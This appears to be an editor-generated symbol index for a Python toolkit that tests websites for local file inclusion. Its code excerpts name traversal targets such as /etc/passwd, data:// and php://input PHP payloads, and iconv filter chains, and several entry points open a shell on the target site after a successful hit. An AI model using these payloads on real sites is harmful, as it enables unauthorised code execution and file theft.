[
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "base64",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "base64",
        "description": "base64",
        "detail": "base64",
        "documentation": {}
    },
    {
        "label": "urllib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib",
        "description": "urllib",
        "detail": "urllib",
        "documentation": {}
    },
    {
        "label": "random",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "random",
        "description": "random",
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "string",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "string",
        "description": "string",
        "detail": "string",
        "documentation": {}
    },
    {
        "label": "requests",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "requests",
        "description": "requests",
        "detail": "requests",
        "documentation": {}
    },
    {
        "label": "Console",
        "importPath": "rich.console",
        "description": "rich.console",
        "isExtraImport": true,
        "detail": "rich.console",
        "documentation": {}
    },
    {
        "label": "Console",
        "importPath": "rich.console",
        "description": "rich.console",
        "isExtraImport": true,
        "detail": "rich.console",
        "documentation": {}
    },
    {
        "label": "Console",
        "importPath": "rich.console",
        "description": "rich.console",
        "isExtraImport": true,
        "detail": "rich.console",
        "documentation": {}
    },
    {
        "label": "Console",
        "importPath": "rich.console",
        "description": "rich.console",
        "isExtraImport": true,
        "detail": "rich.console",
        "documentation": {}
    },
    {
        "label": "Console",
        "importPath": "rich.console",
        "description": "rich.console",
        "isExtraImport": true,
        "detail": "rich.console",
        "documentation": {}
    },
    {
        "label": "Console",
        "importPath": "rich.console",
        "description": "rich.console",
        "isExtraImport": true,
        "detail": "rich.console",
        "documentation": {}
    },
    {
        "label": "PromptSession",
        "importPath": "prompt_toolkit",
        "description": "prompt_toolkit",
        "isExtraImport": true,
        "detail": "prompt_toolkit",
        "documentation": {}
    },
    {
        "label": "PromptSession",
        "importPath": "prompt_toolkit",
        "description": "prompt_toolkit",
        "isExtraImport": true,
        "detail": "prompt_toolkit",
        "documentation": {}
    },
    {
        "label": "PromptSession",
        "importPath": "prompt_toolkit",
        "description": "prompt_toolkit",
        "isExtraImport": true,
        "detail": "prompt_toolkit",
        "documentation": {}
    },
    {
        "label": "PromptSession",
        "importPath": "prompt_toolkit",
        "description": "prompt_toolkit",
        "isExtraImport": true,
        "detail": "prompt_toolkit",
        "documentation": {}
    },
    {
        "label": "HTML",
        "importPath": "prompt_toolkit.formatted_text",
        "description": "prompt_toolkit.formatted_text",
        "isExtraImport": true,
        "detail": "prompt_toolkit.formatted_text",
        "documentation": {}
    },
    {
        "label": "HTML",
        "importPath": "prompt_toolkit.formatted_text",
        "description": "prompt_toolkit.formatted_text",
        "isExtraImport": true,
        "detail": "prompt_toolkit.formatted_text",
        "documentation": {}
    },
    {
        "label": "HTML",
        "importPath": "prompt_toolkit.formatted_text",
        "description": "prompt_toolkit.formatted_text",
        "isExtraImport": true,
        "detail": "prompt_toolkit.formatted_text",
        "documentation": {}
    },
    {
        "label": "HTML",
        "importPath": "prompt_toolkit.formatted_text",
        "description": "prompt_toolkit.formatted_text",
        "isExtraImport": true,
        "detail": "prompt_toolkit.formatted_text",
        "documentation": {}
    },
    {
        "label": "InMemoryHistory",
        "importPath": "prompt_toolkit.history",
        "description": "prompt_toolkit.history",
        "isExtraImport": true,
        "detail": "prompt_toolkit.history",
        "documentation": {}
    },
    {
        "label": "InMemoryHistory",
        "importPath": "prompt_toolkit.history",
        "description": "prompt_toolkit.history",
        "isExtraImport": true,
        "detail": "prompt_toolkit.history",
        "documentation": {}
    },
    {
        "label": "InMemoryHistory",
        "importPath": "prompt_toolkit.history",
        "description": "prompt_toolkit.history",
        "isExtraImport": true,
        "detail": "prompt_toolkit.history",
        "documentation": {}
    },
    {
        "label": "InMemoryHistory",
        "importPath": "prompt_toolkit.history",
        "description": "prompt_toolkit.history",
        "isExtraImport": true,
        "detail": "prompt_toolkit.history",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "urllib.parse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "Progress",
        "importPath": "rich.progress",
        "description": "rich.progress",
        "isExtraImport": true,
        "detail": "rich.progress",
        "documentation": {}
    },
    {
        "label": "Progress",
        "importPath": "rich.progress",
        "description": "rich.progress",
        "isExtraImport": true,
        "detail": "rich.progress",
        "documentation": {}
    },
    {
        "label": "Progress",
        "importPath": "rich.progress",
        "description": "rich.progress",
        "isExtraImport": true,
        "detail": "rich.progress",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "rich.syntax",
        "description": "rich.syntax",
        "isExtraImport": true,
        "detail": "rich.syntax",
        "documentation": {}
    },
    {
        "label": "guess_lexer",
        "importPath": "pygments.lexers",
        "description": "pygments.lexers",
        "isExtraImport": true,
        "detail": "pygments.lexers",
        "documentation": {}
    },
    {
        "label": "get_lexer_by_name",
        "importPath": "pygments.lexers",
        "description": "pygments.lexers",
        "isExtraImport": true,
        "detail": "pygments.lexers",
        "documentation": {}
    },
    {
        "label": "DataChecker",
        "kind": 6,
        "importPath": "DataChecker",
        "description": "DataChecker",
        "peekOfCode": "class DataChecker:\n    def __init__(self, url, silent=False):\n        self.console = Console()\n        self.url = self.ensure_correct_protocol(url)\n        self.silent = silent\n        self.random_string = self._generate_random_string()\n        self.random_string_base64 = base64.b64encode(self.random_string.encode()).decode()\n        self.DATA_PAYLOADS = [\n            f'data://text/plain,<?php echo \"{self.random_string_base64}\"; ?>',\n        ]",
        "detail": "DataChecker",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "DataChecker",
        "description": "DataChecker",
        "peekOfCode": "def main():\n    url = input('Enter site URL to test: ')\n    checker = DataChecker(url, silent=False)\n    result, param_name = checker.data_check()\n    print(f\"LFI2RCE detected: {result}\")\n    if result:\n        checker.shell(param_name)\nif __name__ == '__main__':\n    main()",
        "detail": "DataChecker",
        "documentation": {}
    },
    {
        "label": "EnvironChecker",
        "kind": 6,
        "importPath": "EnvironChecker",
        "description": "EnvironChecker",
        "peekOfCode": "class EnvironChecker:\n    def __init__(self, url, depth=10, silent=False):\n        self.console = Console()\n        self.url =self.ensure_correct_protocol(url)\n        self.depth = depth\n        self.silent = silent\n        self.random_user_agent = self._generate_random_string()\n        self.LFI_TEST_FILES = [\n            ('/proc/self/environ', re.compile(fr'{self.random_user_agent}')),\n        ]",
        "detail": "EnvironChecker",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "EnvironChecker",
        "description": "EnvironChecker",
        "peekOfCode": "def main():\n    url = input('Enter site URL to test: ')\n    checker = EnvironChecker(url, silent=True)\n    output, param_name = checker.environ_check()\n    if output is not None:\n        checker.web_shell(param_name)\nif __name__ == \"__main__\":\n    main()",
        "detail": "EnvironChecker",
        "documentation": {}
    },
    {
        "label": "LFIChecker",
        "kind": 6,
        "importPath": "LFIChecker",
        "description": "LFIChecker",
        "peekOfCode": "class LFIChecker:\n    def __init__(self, url, depth=10, silent=False):\n        self.url = self.ensure_correct_protocol(url)\n        self.depth = depth\n        self.silent = silent\n        self.LFI_TEST_FILES = [\n            ('/etc/passwd', re.compile(r'root:(.*):\\d+:\\d+:')),\n            ('/Windows/System32/drivers/etc/hosts', re.compile(r'127\\.0\\.0\\.1\\s+localhost'))\n        ]\n        self.LFI_PAYLOADS = [",
        "detail": "LFIChecker",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "LFIChecker",
        "description": "LFIChecker",
        "peekOfCode": "def main():\n    url = input('Enter site URL to test: ')\n    checker = LFIChecker(url, silent=False)\n    result = checker.path_traversal_checker()\n    print(f\"LFI detected: {result}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": "LFIChecker",
        "documentation": {}
    },
    {
        "label": "PHPFilterChainGenerator",
        "kind": 6,
        "importPath": "PHPFilterChainGenerator",
        "description": "PHPFilterChainGenerator",
        "peekOfCode": "class PHPFilterChainGenerator:\n    def __init__(self, url, silent=False):\n        self.console = Console()\n        self.url = self.ensure_correct_protocol(url)\n        self.silent = silent\n        self.file_to_use = \"php://temp\"\n        self.string = self._generate_random_string()\n        self.conversions = {\n            '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',\n            '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',",
        "detail": "PHPFilterChainGenerator",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "PHPFilterChainGenerator",
        "description": "PHPFilterChainGenerator",
        "peekOfCode": "def main():\n    url = input('Enter site URL to test: ')\n    checker = PHPFilterChainGenerator(url, silent=False)\n    result, param_name = checker.filter_check()\n    print(f\"LFI detected: {result}\")\n    if result:\n        checker.shell(param_name)\nif __name__ == '__main__':\n    main()",
        "detail": "PHPFilterChainGenerator",
        "documentation": {}
    },
    {
        "label": "PHPFilterChecker",
        "kind": 6,
        "importPath": "PHPFilterChecker",
        "description": "PHPFilterChecker",
        "peekOfCode": "class PHPFilterChecker:\n    def __init__(self, url, depth=10, silent=False):\n        self.console = Console()\n        self.url = self.ensure_correct_protocol(url)\n        self.depth = depth\n        self.silent = silent\n        self.success_depth = None\n        self.base64_content = None\n    def ensure_correct_protocol(self, url):\n        if not url.startswith(('http://', 'https://')):",
        "detail": "PHPFilterChecker",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "PHPFilterChecker",
        "description": "PHPFilterChecker",
        "peekOfCode": "def main():\n    url = input('Enter site URL to test: ')\n    filename = input('Enter filename to display: ')\n    checker = PHPFilterChecker(url, silent=False)\n    result = checker.filter_check()\n    print(f\"LFI detected: {result}\")\n    if result:\n        checker.exploit(filename)\nif __name__ == \"__main__\":\n    main()",
        "detail": "PHPFilterChecker",
        "documentation": {}
    },
    {
        "label": "PHPInputExploiter",
        "kind": 6,
        "importPath": "PHPInputExploiter",
        "description": "PHPInputExploiter",
        "peekOfCode": "class PHPInputExploiter:\n    def __init__(self, url, silent=False):\n        self.console = Console()\n        self.url = self.ensure_correct_protocol(url)\n        self.silent = silent\n        self.file_to_use = \"php://input\"\n        self.string = self._generate_random_string()\n        self.LFI_TEST_FILES = [\n            (f\"<?php echo '{self.string}'; ?>\", re.compile(fr'{self.string}')),\n        ]",
        "detail": "PHPInputExploiter",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "PHPInputExploiter",
        "description": "PHPInputExploiter",
        "peekOfCode": "def main():\n    url = input('Enter site URL to test: ')\n    checker = PHPInputExploiter(url, silent=False)\n    result, param_name = checker.filter_check()\n    print(f\"LFI detected: {result}\")\n    if result:\n        checker.shell(param_name)\nif __name__ == '__main__':\n    main()",
        "detail": "PHPInputExploiter",
        "documentation": {}
    }
]